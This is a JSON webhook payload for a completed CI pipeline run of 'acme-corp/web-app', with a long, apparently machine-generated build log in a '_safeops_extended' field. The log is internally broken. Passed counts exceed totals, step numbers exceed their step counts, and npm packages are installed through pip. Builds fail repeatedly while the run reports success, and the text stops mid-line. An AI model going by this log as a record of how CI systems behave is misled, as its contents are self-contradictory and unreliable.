{
  "action": "completed",
  "workflow_run": {
    "id": 240,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-316",
    "head_sha": "8db075f53294d31186a9f56a70967111fab6e2bd",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-25T12:18:17.453579Z",
    "updated_at": "2025-11-25T12:24:22.186428Z"
  },
  "repository": {
    "full_name": "acme-corp/web-app",
    "name": "web-app"
  },
  "sender": {
    "login": "grace"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: e2e_tests ===\npip install: Successfully installed eslint-5.19\nnpm install: resolved 607 packages\n[12:18:17] DEBUG: Query executed in 30ms\n\u2713 Task completed in 4104ms\nStep 6/20: Linting\nReady.\nStep 4/16: Linting\nImage pulled successfully\nWARNING: react has known vulnerabilities\nSwitched to branch 'bugfix/task-462'\nnpm notice: package.json updated\nSuccess!\nCache saved successfully\nReady.\nReady.\n[12:18:17] DEBUG: Query executed in 32ms\n\u2713 Step 'install' succeeded\nCache hit for key-9879\nCoverage: 80% statements, 70% branches\nCache miss for key-8106\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n[12:18:17] WARN: Deprecated API usage\nWARNING: react has known vulnerabilities\nPulling image: node:18\nPlatform: linux-x64\nOptimizing 71 modules...\nConnecting to example.com:443...\n[12:18:17] DEBUG: Connection pool: 10 active\nDone.\nMinifying main.js\nTime: 116.619s\n[12:18:17] INFO: Processing request\nMinifying main.js\nTime: 46.572s\nSuccess!\nStep 6/25: Deploying\nCache hit for key-5898\nCoverage: 70% statements, 70% branches\nVerifying...\nFAILED: test_db_connect\nVerifying...\nConnecting to acme.corp:443...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:17] WARN: Deprecated API usage\nConnection established\nPulling image: alpine:18\nArtifact uploaded: build.tar.gz (22MB)\nEnvironment: staging\n[12:18:17] WARN: Deprecated API usage\npip install: Successfully installed express-3.11\nCache miss for key-1152\nCompiling src/app.ts...\nCoverage: 100% statements, 91% branches\nCache saved successfully\nWARNING: prettier has known vulnerabilities\nStep 6/18: Building\nBundling runtime.js\n[12:18:17] INFO: Cache refreshed\n[12:18:17] WARN: Deprecated API usage\nyarn add: Done in 20.56s\nSnapshots: 43 passed, 17 total\nSuccess!\n[12:18:17] DEBUG: Connection pool: 1 active\nAlready up to date.\nnpm install: resolved 176 packages\nArtifact uploaded: build.tar.gz (6MB)\nCache restored successfully (61MB)\npip: Collecting express\nInstalling webpack@4.20.6\nGET /status - 200 (77ms)\nArtifact downloaded: 35MB\nLayer 1/13: RUN command\n[12:18:17] INFO: Cache refreshed\nUsing Python 3.10\nOptimizing 77 modules...\nFinished.\nCompiling lib/handler.rs...\n\u2713 Step 'build' succeeded\nOptimizing 72 modules...\nyarn add: Done in 27.69s\nOK\nProcessing...\nRan 145 tests in 35s\nPulling image: alpine:18\n[12:18:17] DEBUG: Memory usage: 1020MB\n\u2717 build failed with exit code 114\npip: Downloading lodash-2.9.tar.gz\nCache restored successfully (39MB)\npip: Installing build dependencies...\nSnapshots: 19 passed, 40 total\npip: Collecting prettier\nyarn add: Done in 23.91s\nLoading...\nCompiling components/app.ts...\n\u2717 build failed with exit code 15\nStep 17/15: Linting\nPOST /api - 201 (210ms)\n\u2713 Step 'test' succeeded\nUsing Node.js 17.20.3\n[12:18:17] WARN: Deprecated API usage\nnpm install: resolved 107 packages\nVerifying...\nFetching submodules...\n[12:18:17] DEBUG: Initializing service\n  PASS: e2e/test_auth_login.spec.js\nEnvironment: production\nSuccess!\nCompiling src/main.py...\nGET /api - 204 (80ms)\nCreating production build...\n[12:18:17] DEBUG: Initializing service\nWaiting...\nnpm install: added 229 packages\npip: Collecting jest\n[12:18:17] DEBUG: Query executed in 9ms\npip: Collecting webpack\nProcessing...\nCompiling lib/utils.go...\n[12:18:17] ERROR: Connection failed\nCompiling components/app.ts...\nBundling main.css\nGET /api - 204 (35ms)\n\u2713 test completed\nGET /api - 201 (8ms)\nCompiling lib/service.java...\nArtifact uploaded: build.tar.gz (13MB)\nCache invalidated: node_modules\nChecking out develop branch\nReady.\nStep 11/15: Deploying\nFinished.\nCompiling lib/utils.go...\nOK\nArtifact uploaded: build.tar.gz (8MB)\nStep 17/22: Building\nVerifying...\npip install: Successfully installed jest-4.17\n  PASS: test_user_create (125ms)\nGenerating source maps...\n\u26a0 DEPRECATION: Feature will be removed in v5.0\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nOK\nArtifact uploaded: dist.zip (63MB)\nCache miss for key-7749\nnpm notice: package.json updated\nImage pulled successfully\n[12:18:17] INFO: Cache refreshed\nyarn add: Done in 9.74s\nTests: 343 passed, 448 total\nStep 10/25: Building\nTime: 2.716s\nWaiting...\nStep 19/16: Running migrations\nGenerating source maps...\n\u2713 validate completed\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:18:17] DEBUG: Initializing service\nStep 12/25: Linting\nArtifact uploaded: build.tar.gz (48MB)\nBundling styles.css\nDone.\npip: Downloading express-2.8.tar.gz\nPushing to registry...\n\u2713 All checks passed\nStep 6/20: Deploying\nWARNING: lodash has known vulnerabilities\nFetching submodules...\nCache miss for key-3545\nLayer 6/15: COPY command\nOptimizing 92 modules...\nProcessing...\n[12:18:17] INFO: Connecting to database\npip: Downloading eslint-3.1.tar.gz\nWaiting...\n[12:18:17] DEBUG: Initializing service\n[12:18:17] INFO: Cache refreshed\nWARNING: axios has known vulnerabilities\nDone.\nWARNING: express has known vulnerabilities\nWARNING: axios has known vulnerabilities\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nConnection established\n[12:18:17] WARN: Deprecated API usage\nMinifying main.js\nPulling image: alpine:18\nWARNING: axios has known vulnerabilities\nHEAD is now at edce52a\nUploading artifact 'build' (32 files)\nLayer 9/11: RUN command\nCreating production build...\n[12:18:17] WARN: Deprecated API usage\nTests: 310 passed, 154 total\n[12:18:17] INFO: Cache refreshed\nCoverage: 80% statements, 69% branches\nnpm install: resolved 1536 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 11/16: Linting\nCompleted.\nStep 20/25: Installing dependencies\nPOST /upload - 201 (147ms)\nFinished.\n=== Step e2e_tests completed ===\n=== Step: restore_cache ===\nWARNING: react has known vulnerabilities\nStep 19/24: Installing dependencies\n\u2713 validate completed\nEnvironment: production\n[12:18:17] INFO: Cache refreshed\npip: Installing build dependencies...\nOK\n[12:18:17] DEBUG: Connection pool: 16 active\nWARNING: jest has known vulnerabilities\nFetching submodules...\nStep 8/23: Linting\n[12:18:17] INFO: Cache refreshed\n[12:18:17] INFO: Request completed\nArtifact uploaded: build.tar.gz (46MB)\nPlatform: win32-x64\nCache invalidated: dependencies\nFetching submodules...\nBuilding Docker image...\n[12:18:17] INFO: Starting build process\n\u2713 Task completed in 1662ms\nUsing Python 3.12\nTime: 102.483s\n\u2717 build failed with exit code 35\n[12:18:17] INFO: Processing request\nStep 10/18: Linting\nPulling image: python:18\nOK\n\u2713 lint completed\nTests: 479 passed, 298 total\nCache saved successfully\nReady.\nImage pulled successfully\nFinished.\n[12:18:17] INFO: Connecting to database\n[12:18:17] DEBUG: Loading configuration\nTest Suites: 39 passed, 35 total\nCompiling src/main.py...\nWaiting...\nProcessing...\nStep 18/22: Building\nCompiling lib/handler.rs...\n\u2713 Step 'test' succeeded\nCache restored successfully (434MB)\nArtifact uploaded: dist.zip (40MB)\nWaiting...\nLayer 2/12: COPY command\n[12:18:17] INFO: Cache refreshed\npip: Downloading react-2.6.tar.gz\nCompiling utils/index.js...\nCreating production build...\nRan 167 tests in 32s\nDone.\nCache saved successfully\nCache saved successfully\nWaiting...\nCache restored successfully (434MB)\n\u2713 Step 'build' succeeded\nCoverage: 91% statements, 84% branches\nHEAD is now at 41ced0f\n\u2713 All checks passed\nStep 6/16: Deploying\n\u2713 All checks passed\nCompiling lib/service.java...\n[12:18:17] DEBUG: Loading configuration\nProcessing...\nWARNING: axios has known vulnerabilities\nUsing Python 3.9\nOptimizing 37 modules...\nReady.\nnpm notice: package.json updated\nChecking out master branch\nArtifact uploaded: build.tar.gz (36MB)\nWaiting...\nFAILED: test_auth_login\n[12:18:17] DEBUG: Loading configuration\n[12:18:17] INFO: Cache refreshed\nWaiting...\nFetching submodules...\nTLS handshake completed\nGET /api - 204 (69ms)\nChecking out develop branch\n[12:18:17] INFO: Starting build process\nGET /status - 200 (37ms)\nCache saved successfully\n\u2713 build completed\nProcessing...\npip install: Successfully installed lodash-5.18\nUsing Node.js 17.4.2\nCompiling src/main.py...\nBuilding Docker image...\nFetching submodules...\nCache restored successfully (98MB)\nVerifying...\n[12:18:17] INFO: Cache refreshed\n[12:18:17] DEBUG: Loading configuration\npip: Installing build dependencies...\npip install: Successfully installed axios-4.10\nSnapshots: 38 passed, 23 total\nStep 19/18: Deploying\nUploading artifact 'dist' (22 files)\nEnvironment: staging\n[12:18:17] DEBUG: Query executed in 65ms\n[12:18:17] INFO: Cache refreshed\nDone.\n[12:18:17] INFO: Request completed\nReady.\npip install: Successfully installed axios-5.1\nWARNING: express has known vulnerabilities\nArtifact downloaded: 43MB\nnpm notice: package.json updated\nCompleted.\nLayer 10/11: RUN command\nEnvironment: test\n[12:18:17] WARN: Deprecated API usage\nStep 4/24: Building\nCoverage: 87% statements, 87% branches\nTests: 310 passed, 127 total\nException: ValueError\n\u2713 All checks passed\nChecking out main branch\nCache invalidated: node_modules\n[12:18:17] DEBUG: Connection pool: 19 active\nCache saved successfully\nCompiling src/utils.go...\nSwitched to branch 'feature/task-952'\nUsing Python 3.12\nnpm install: resolved 423 packages\nArtifact downloaded: 11MB\n[12:18:17] DEBUG: Loading configuration\nCache saved successfully\n[12:18:17] DEBUG: Loading configuration\nInstalling lodash@2.16.6\nGenerating source maps...\nGET /status - 200 (65ms)\nOK\nConnecting to startup.dev:443...\nImage pulled successfully\nTest Suites: 15 passed, 38 total\nRan 62 tests in 2s\nNODE_ENV=test\nFinished.\nWARNING: express has known vulnerabilities\nPushing to registry...\nnpm install: added 464 packages\nSwitched to branch 'feature/task-541'\nImage pulled successfully\nStep 2/23: Installing dependencies\nAlready up to date.\nWARNING: react has known vulnerabilities\nSuccess!\nReady.\nStep 5/17: Deploying\nCompiling components/service.java...\nUsing Node.js 19.20.3\nInstalling jest@3.15.1\nArtifact downloaded: 40MB\n[12:18:17] DEBUG: Loading configuration\nAlready up to date.\nGenerating source maps...\nRan 170 tests in 56s\nnpm install: resolved 471 packages\n[12:18:17] DEBUG: Connection pool: 20 active\nNODE_ENV=development\nNODE_ENV=production\n\u2713 package completed\nWaiting...\nAlready up to date.\npip: Downloading lodash-5.8.tar.gz\nReady.\nCache invalidated: build\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache hit for key-4216\nStep 12/22: Linting\n[12:18:17] DEBUG: Loading configuration\nStep 9/17: Linting\nWARNING: webpack has known vulnerabilities\nTLS handshake completed\nOK\nSwitched to branch 'hotfix/task-950'\nCompleted.\n[12:18:17] INFO: Connecting to database\nCache saved successfully\n[12:18:17] INFO: Request completed\n\u2717 build failed with exit code 101\nWARNING: prettier has known vulnerabilities\nReady.\nStep 14/22: Installing dependencies\nStep 2/19: Running migrations\n\u2713 Step 'install' succeeded\nTests: 104 passed, 131 total\nTime: 95.523s\nReady.\n[12:18:17] DEBUG: Loading configuration\n[12:18:17] DEBUG: Initializing service\nTransforming 852 files...\nCompiling src/index.js...\n[12:18:17] DEBUG: Initializing service\nTransforming 217 files...\n[12:18:17] INFO: Request completed\nBundling vendor.css\nPulling image: node:3.11\n=== Step restore_cache completed ===\n=== Step: lint ===\n  PASS: e2e/test_auth_login.spec.js\nPOST /upload - 200 (250ms)\nUsing Node.js 15.6.7\n[12:18:17] DEBUG: Memory usage: 420MB\n[12:18:17] DEBUG: Connection pool: 2 active\nFinished.\nWARNING: webpack has known vulnerabilities\n[12:18:17] INFO: Cache refreshed\n  PASS: e2e/test_api_health.spec.js\nCompiling utils/service.java...\nStep 5/24: Deploying\nHEAD is now at 8315c69\nTest Suites: 31 passed, 23 total\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nSuccess!\nCache invalidated: dependencies\nOptimizing 95 modules...\nCompleted.\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Query executed in 41ms\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nCache hit for key-8811\nRan 99 tests in 44s\n[12:18:17] DEBUG: Loading configuration\nArtifact uploaded: build.tar.gz (32MB)\nFAILED: test_db_connect\nPOST /api - 200 (98ms)\nPulling image: alpine:latest\nUsing Python 3.9\nSwitched to branch 'feature/task-185'\nCompiling components/handler.rs...\n\u2717 build failed with exit code 96\nTLS handshake completed\nStep 8/20: Building\nReady.\nCoverage: 72% statements, 64% branches\nVerifying...\n[12:18:17] INFO: Request completed\nWaiting...\n  PASS: e2e/test_db_connect.spec.js\n[12:18:17] DEBUG: Memory usage: 777MB\nProcessing...\nLoading...\nAlready up to date.\nTransforming 398 files...\n  PASS: integration/test_cache_hit.spec.js\nBuilding Docker image...\n[12:18:17] INFO: Starting build process\npip: Installing build dependencies...\n[12:18:17] INFO: Cache refreshed\nTime: 117.400s\n\u2713 All checks passed\nDone.\n  PASS: test_cache_hit (228ms)\nGenerating source maps...\nStep 10/17: Running migrations\n\u2713 package completed\nOK\n[12:18:17] INFO: Cache refreshed\nCompiling components/main.py...\nCache invalidated: dependencies\n[12:18:17] DEBUG: Loading configuration\nSwitched to branch 'bugfix/task-494'\nStep 8/23: Testing\npip: Downloading webpack-4.9.tar.gz\n\u2713 All checks passed\nWARNING: axios has known vulnerabilities\nTests: 406 passed, 402 total\nStep 14/20: Linting\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Processing request\nCoverage: 85% statements, 83% branches\npip install: Successfully installed react-3.9\npip: Installing build dependencies...\nStep 15/23: Deploying\n[12:18:17] INFO: Cache refreshed\nFinished.\n[12:18:17] DEBUG: Connection pool: 1 active\nReady.\nTime: 49.550s\nArtifact uploaded: build.tar.gz (24MB)\nyarn add: Done in 17.26s\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nFetching submodules...\nEnvironment: test\n[12:18:17] INFO: Starting build process\n[12:18:17] DEBUG: Loading configuration\nnpm install: resolved 1091 packages\nChecking out main branch\n  PASS: e2e/test_cache_hit.spec.js\nVerifying...\nSwitched to branch 'feature/task-324'\nPulling image: node:latest\npip: Collecting axios\nCompiling src/index.js...\nOptimizing 90 modules...\nGET /status - 200 (59ms)\nPulling image: node:3.11\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting express\nCompiling lib/app.ts...\n[12:18:17] DEBUG: Initializing service\nCompleted.\nReady.\npip install: Successfully installed lodash-2.8\nHEAD is now at 7fb7d5e\n[12:18:17] INFO: Request completed\nPushing to registry...\nFetching submodules...\nArtifact uploaded: build.tar.gz (39MB)\nFinished.\n[12:18:17] INFO: Processing request\nnpm notice: created a lockfile\nInstalling eslint@1.15.5\n[12:18:17] INFO: Request completed\nUsing Python 3.12\nChecking out main branch\n[12:18:17] DEBUG: Loading configuration\nProcessing...\nCompiling utils/utils.go...\nFAILED: test_auth_login\npip: Collecting webpack\nException: NullPointerException\npip: Collecting eslint\n[12:18:17] WARN: Deprecated API usage\nWARNING: express has known vulnerabilities\nChecking out main branch\n[12:18:17] DEBUG: Loading configuration\nStep 18/16: Building\nArtifact downloaded: 26MB\nRan 171 tests in 53s\nnpm install: added 493 packages\nArtifact downloaded: 46MB\n  PASS: integration/test_api_health.spec.js\nArtifact uploaded: dist.zip (77MB)\nFAILED: test_auth_login\nTransforming 114 files...\nPushing to registry...\nVerifying...\n[12:18:17] INFO: Starting build process\nTransforming 250 files...\nArtifact uploaded: build.tar.gz (44MB)\nCache saved successfully\nRan 32 tests in 10s\nCache saved successfully\nCache miss for key-5636\nLoading...\nTests: 199 passed, 369 total\nUploading artifact 'build' (49 files)\n[12:18:17] WARN: Deprecated API usage\n\u2713 All checks passed\nVerifying...\n[12:18:17] INFO: Starting build process\n[12:18:17] DEBUG: Memory usage: 333MB\nLayer 8/13: RUN command\nnpm install: resolved 959 packages\nProcessing...\n[12:18:17] WARN: Deprecated API usage\nCoverage: 91% statements, 96% branches\nVerifying...\nImage pulled successfully\nCreating production build...\nCache saved successfully\nVerifying...\nCreating production build...\nException: RuntimeError\n[12:18:17] DEBUG: Initializing service\nOK\nFAILED: test_auth_login\nConnecting to test.io:443...\nPOST /api - 200 (287ms)\nStep 3/24: Linting\n[12:18:17] INFO: Processing request\nBundling runtime.js\nCache miss for key-2626\nNODE_ENV=production\nSnapshots: 49 passed, 44 total\nReady.\nMinifying vendor.js\nPlatform: win32-x64\nBundling vendor.js\nConnection established\n[12:18:17] DEBUG: Connection pool: 4 active\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 3/24: Running migrations\n  PASS: unit/test_api_health.spec.js\nConnecting to cloud.services:443...\npip: Collecting jest\nArtifact uploaded: dist.zip (2MB)\nArtifact downloaded: 48MB\nInstalling eslint@5.20.5\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nStep 7/22: Installing dependencies\nBuilding Docker image...\n[12:18:17] DEBUG: Loading configuration\n\u2713 Step 'setup' succeeded\n[12:18:17] DEBUG: Loading configuration\n[12:18:17] DEBUG: Loading configuration\nCache saved successfully\nCache saved successfully\nUsing Node.js 19.2.4\n=== Step lint completed ===\n=== Step: checkout ===\npip: Installing build dependencies...\nOptimizing 53 modules...\nCache restored successfully (468MB)\nArtifact downloaded: 45MB\nOptimizing 38 modules...\nCache invalidated: dependencies\nUsing Python 3.12\npip: Downloading prettier-5.11.tar.gz\nPOST /api - 202 (163ms)\nArtifact uploaded: dist.zip (87MB)\nyarn add: Done in 7.12s\n[12:18:17] DEBUG: Query executed in 74ms\nBundling runtime.js\nnpm notice: package.json updated\nTLS handshake completed\n[12:18:17] INFO: Request completed\nCreating production build...\npip install: Successfully installed webpack-2.7\nChecking out main branch\n\u2713 Task completed in 4449ms\nPulling image: alpine:latest\nArtifact downloaded: 16MB\nCompiling components/index.js...\nBundling vendor.css\n  PASS: integration/test_user_create.spec.js\nyarn add: Done in 4.44s\nArtifact downloaded: 5MB\n[12:18:17] DEBUG: Loading configuration\nPushing to registry...\nPulling image: python:latest\nnpm notice: package.json updated\nBundling vendor.js\nCompiling lib/index.js...\nTests: 246 passed, 144 total\nStep 18/21: Building\n[12:18:17] DEBUG: Memory usage: 1640MB\nException: ValueError\npip: Collecting axios\nSuccess!\npip: Collecting express\n[12:18:17] WARN: Deprecated API usage\n\u2713 Task completed in 2090ms\n[12:18:17] DEBUG: Loading configuration\nRan 66 tests in 31s\nPOST /upload - 202 (41ms)\nUploading artifact 'build' (9 files)\nImage pulled successfully\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:18:17] DEBUG: Query executed in 83ms\nGenerating source maps...\nCoverage: 85% statements, 90% branches\n\u2717 build failed with exit code 114\nnpm notice: package.json updated\n[12:18:17] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nyarn add: Done in 23.54s\nLoading...\nFetching submodules...\nnpm install: resolved 1899 packages\n\u2713 All checks passed\nStep 4/21: Running migrations\n[12:18:17] DEBUG: Initializing service\nStep 15/25: Building\nUploading artifact 'build' (9 files)\nMinifying main.js\nNODE_ENV=test\n\u2713 Step 'install' succeeded\npip: Collecting webpack\nCache invalidated: node_modules\nArtifact downloaded: 40MB\nRan 44 tests in 14s\nCompiling src/handler.rs...\nnpm install: added 169 packages\nSnapshots: 31 passed, 26 total\nnpm install: resolved 1525 packages\nCache invalidated: node_modules\n  PASS: test_api_health (359ms)\nGenerating source maps...\nConnecting to startup.dev:443...\nSwitched to branch 'bugfix/task-326'\n[12:18:17] DEBUG: Initializing service\nGET /health - 204 (88ms)\nArtifact uploaded: dist.zip (17MB)\nInstalling prettier@3.15.8\nInstalling jest@5.8.6\nSnapshots: 42 passed, 38 total\nImage pulled successfully\nGenerating source maps...\nBundling styles.css\nLoading...\nConnecting to acme.corp:443...\n  PASS: integration/test_db_connect.spec.js\n[12:18:17] DEBUG: Connection pool: 11 active\nWARNING: axios has known vulnerabilities\n  PASS: e2e/test_api_health.spec.js\nnpm install: added 92 packages\nTLS handshake completed\nWARNING: eslint has known vulnerabilities\npip: Downloading axios-5.2.tar.gz\nOptimizing 48 modules...\nProcessing...\nBundling runtime.css\nPlatform: darwin-arm64\nTime: 50.42s\n[12:18:17] DEBUG: Initializing service\n[12:18:17] INFO: Connecting to database\nCompiling utils/index.js...\nTime: 79.744s\nBundling runtime.css\nWARNING: react has known vulnerabilities\nStep 11/21: Testing\nnpm notice: package.json updated\nnpm install: added 180 packages\nSuccess!\nGET /health - 200 (43ms)\nImage pulled successfully\nCompiling components/service.java...\nnpm install: added 24 packages\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nStep 11/22: Installing dependencies\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] WARN: Deprecated API usage\nSnapshots: 46 passed, 19 total\n\u2713 Step 'checkout' succeeded\npip install: Successfully installed eslint-2.3\n  PASS: integration/test_api_health.spec.js\nCompiling src/handler.rs...\nCache miss for key-4364\nFetching submodules...\n  PASS: test_api_health (378ms)\nAlready up to date.\nCompiling src/utils.go...\nSwitched to branch 'feature/task-312'\nPulling image: python:latest\nInstalling lodash@3.18.3\nException: NullPointerException\npip: Collecting axios\nBundling styles.js\n\u2717 build failed with exit code 85\nCache restored successfully (241MB)\n[12:18:17] DEBUG: Connection pool: 2 active\nBuilding Docker image...\n[12:18:17] DEBUG: Memory usage: 1071MB\n[12:18:17] INFO: Request completed\nCache miss for key-3460\npip: Collecting react\nNODE_ENV=test\nFAILED: test_cache_hit\n[12:18:17] INFO: Connecting to database\npip: Collecting axios\nSwitched to branch 'feature/task-379'\nSwitched to branch 'hotfix/task-770'\npip: Collecting lodash\nException: RuntimeError\nGET /api - 201 (35ms)\nEnvironment: staging\nConnection established\nLayer 4/15: RUN command\npip install: Successfully installed express-3.16\nStep 4/16: Testing\n[12:18:17] INFO: Request completed\nProcessing...\nArtifact downloaded: 4MB\n\u2713 deploy completed\n[12:18:17] INFO: Starting build process\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nPulling image: python:3.11\nUsing Python 3.12\npip install: Successfully installed express-2.4\n[12:18:17] INFO: Processing request\nTest Suites: 49 passed, 35 total\nCache miss for key-4984\nGenerating source maps...\nyarn add: Done in 21.57s\nArtifact uploaded: dist.zip (54MB)\nInstalling lodash@3.9.1\nPOST /data - 201 (329ms)\nAlready up to date.\nOptimizing 42 modules...\nSnapshots: 5 passed, 23 total\n[12:18:17] INFO: Request completed\nStep 7/24: Running migrations\nGenerating source maps...\n[12:18:17] DEBUG: Initializing service\nHEAD is now at f1c44c4\nHEAD is now at 102a5cf\nCompiling components/handler.rs...\nStep 11/20: Running migrations\nUsing Node.js 16.10.6\nPlatform: win32-x64\n  PASS: test_cache_hit (245ms)\nLayer 7/12: COPY command\nAlready up to date.\nCache invalidated: build\nArtifact uploaded: build.tar.gz (24MB)\nArtifact uploaded: dist.zip (16MB)\nEnvironment: staging\nCompleted.\nGET /health - 200 (16ms)\n[12:18:17] INFO: Processing request\n=== Step checkout completed ===\n=== Step: save_cache ===\nStep 10/20: Linting\n[12:18:17] WARN: Deprecated API usage\nException: TypeError\nnpm install: resolved 971 packages\nException: NullPointerException\nNODE_ENV=production\nStep 8/19: Linting\n\u2713 lint completed\nCoverage: 89% statements, 95% branches\nEnvironment: test\nCoverage: 85% statements, 91% branches\npip: Collecting lodash\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Connection pool: 16 active\nSnapshots: 17 passed, 14 total\nException: ValueError\nRan 101 tests in 58s\n[12:18:17] DEBUG: Memory usage: 1249MB\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u2717 build failed with exit code 94\nProcessing...\nLayer 8/9: COPY command\nSnapshots: 13 passed, 4 total\nBundling main.css\n[12:18:17] DEBUG: Memory usage: 214MB\nTransforming 377 files...\nUsing Node.js 19.4.0\nCompiling lib/app.ts...\nImage pulled successfully\npip install: Successfully installed express-5.1\npip: Downloading prettier-3.8.tar.gz\nCompleted.\nBuilding Docker image...\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Loading configuration\nException: TypeError\n[12:18:17] INFO: Connecting to database\nCompiling lib/index.js...\nCache invalidated: dependencies\nCompiling components/index.js...\nProcessing...\nArtifact uploaded: dist.zip (72MB)\n[12:18:17] DEBUG: Loading configuration\nnpm notice: created a lockfile\nCreating production build...\nCompleted.\nnpm notice: package.json updated\nCompleted.\n[12:18:17] DEBUG: Loading configuration\nPushing to registry...\nException: TypeError\nMinifying main.js\npip: Installing build dependencies...\nProcessing...\nChecking out master branch\nTLS handshake completed\nProcessing...\nCache hit for key-9013\n\u2713 deploy completed\nCache saved successfully\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nCache hit for key-7796\n[12:18:17] WARN: Deprecated API usage\nGenerating source maps...\nConnecting to cloud.services:443...\n[12:18:17] WARN: Deprecated API usage\nCompleted.\nConnection established\npip: Downloading eslint-5.19.tar.gz\nCreating production build...\nFinished.\n\u2713 Step 'build' succeeded\nPOST /upload - 200 (216ms)\nCache miss for key-7788\nEnvironment: development\nPlatform: win32-x64\nCompleted.\n[12:18:17] DEBUG: Query executed in 69ms\nCache invalidated: build\n[12:18:17] WARN: Deprecated API usage\nStep 19/20: Linting\nTest Suites: 18 passed, 46 total\nnpm notice: package.json updated\nWaiting...\nWaiting...\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nEnvironment: test\nStep 20/24: Deploying\nPulling image: alpine:18\nSuccess!\nConnection established\nArtifact uploaded: dist.zip (16MB)\n\u2713 test completed\nException: RuntimeError\nTests: 453 passed, 259 total\nPlatform: win32-x64\nyarn add: Done in 2.61s\nCompiling components/index.js...\nMinifying vendor.js\nUploading artifact 'build' (45 files)\n[12:18:17] WARN: Deprecated API usage\n[12:18:17] INFO: Request completed\nStep 4/16: Testing\nSwitched to branch 'bugfix/task-272'\n[12:18:17] INFO: Processing request\npip: Collecting express\nEnvironment: production\nTime: 25.16s\nUsing Python 3.12\nStep 2/19: Building\n[12:18:17] INFO: Cache refreshed\nConnecting to acme.corp:443...\nCoverage: 85% statements, 99% branches\nEnvironment: production\nnpm notice: created a lockfile\nPushing to registry...\nTest Suites: 22 passed, 24 total\nWARNING: webpack has known vulnerabilities\nPOST /data - 202 (431ms)\nArtifact uploaded: build.tar.gz (31MB)\nWaiting...\nStep 3/15: Running migrations\nVerifying...\nBuilding Docker image...\nDone.\nCache hit for key-2819\n[12:18:17] INFO: Starting build process\n\u2717 build failed with exit code 9\nBuilding Docker image...\n[12:18:17] DEBUG: Query executed in 15ms\nOptimizing 90 modules...\nAlready up to date.\nDone.\nyarn add: Done in 28.72s\nPulling image: node:latest\n[12:18:17] DEBUG: Loading configuration\n[12:18:17] INFO: Starting build process\npip: Downloading webpack-2.6.tar.gz\nStep 18/22: Running migrations\n[12:18:17] DEBUG: Loading configuration\nVerifying...\nChecking out master branch\nPulling image: alpine:3.11\nHEAD is now at 523ba93\nStep 11/21: Deploying\nStep 15/24: Running migrations\nMinifying app.js\nConnection established\nInstalling react@5.4.6\nWaiting...\nStep 10/25: Testing\npip: Installing build dependencies...\nMinifying main.js\nTime: 85.239s\n[12:18:17] WARN: Deprecated API usage\nConnecting to cloud.services:443...\n[12:18:17] INFO: Processing request\npip: Installing build dependencies...\nnpm notice: package.json updated\nCache miss for key-9719\nCache miss for key-2288\nWARNING: lodash has known vulnerabilities\nPlatform: linux-x64\n[12:18:17] INFO: Processing request\n\u2713 lint completed\nAlready up to date.\nCompiling utils/utils.go...\nStep 20/18: Deploying\n  PASS: test_db_connect (442ms)\n[12:18:17] INFO: Starting build process\nCache saved successfully\nTest Suites: 15 passed, 12 total\nCompleted.\nCreating production build...\nPulling image: alpine:18\nBuilding Docker image...\nRan 180 tests in 10s\nTransforming 766 files...\nArtifact uploaded: dist.zip (62MB)\nRan 150 tests in 4s\n\u2713 deploy completed\nCompiling src/service.java...\n\u2713 All checks passed\n[12:18:17] INFO: Request completed\nConnection established\nCoverage: 71% statements, 77% branches\nTime: 106.626s\nLoading...\nCreating production build...\nCache saved successfully\nnpm notice: package.json updated\nProcessing...\nMinifying app.js\nTest Suites: 29 passed, 19 total\nAlready up to date.\n[12:18:17] INFO: Processing request\nFAILED: test_cache_hit\nChecking out main branch\nCache miss for key-3062\nTests: 202 passed, 371 total\nCache miss for key-9465\n=== Step save_cache completed ===\n=== Step: setup_environment ===\nAlready up to date.\nCache restored successfully (474MB)\nnpm notice: package.json updated\nRan 98 tests in 17s\nStep 14/16: Running migrations\n[12:18:17] INFO: Request completed\nPushing to registry...\nArtifact uploaded: build.tar.gz (34MB)\nFinished.\nCache invalidated: node_modules\nChecking out develop branch\nWaiting...\nWARNING: express has known vulnerabilities\n\u2717 build failed with exit code 67\nEnvironment: development\npip: Collecting axios\n[12:18:17] WARN: Deprecated API usage\nStep 11/23: Linting\nTests: 75 passed, 423 total\nOptimizing 60 modules...\nProcessing...\n[12:18:17] INFO: Request completed\nGenerating source maps...\n[12:18:17] DEBUG: Initializing service\n[12:18:17] DEBUG: Memory usage: 1424MB\n\u2713 Step 'build' succeeded\nOK\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nArtifact uploaded: dist.zip (61MB)\nImage pulled successfully\nCache miss for key-7222\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nStep 14/15: Linting\nTransforming 833 files...\nWARNING: jest has known vulnerabilities\nVerifying...\nTime: 69.627s\nCompiling src/utils.go...\nyarn add: Done in 26.64s\nStep 12/19: Testing\nnpm install: resolved 1714 